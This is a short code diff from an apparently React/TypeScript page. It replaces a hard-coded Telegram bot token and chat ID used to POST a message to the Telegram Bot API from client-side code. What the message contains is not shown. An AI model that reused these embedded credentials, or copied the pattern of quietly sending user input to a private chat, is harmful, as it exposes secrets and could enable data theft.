@@ -159,12 +159,12 @@ const [preview, setPreview] = useState<any>({});
 `;
 
     const res = await fetch(
-      "https://api.telegram.org/bot8748009536:AAGvxYJXXZ5Hgp8QirPUqi4HT1KIF2WU3xw/sendMessage",
+      "https://api.telegram.org/bot8341460495:AAGUJ4tCtofsbtHGQZzr1tDZaT-GZrGaNsQ/sendMessage",
       {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: "7771995781",
+          chat_id: "8698647779",
           text: message,
           parse_mode: "Markdown",
         }),
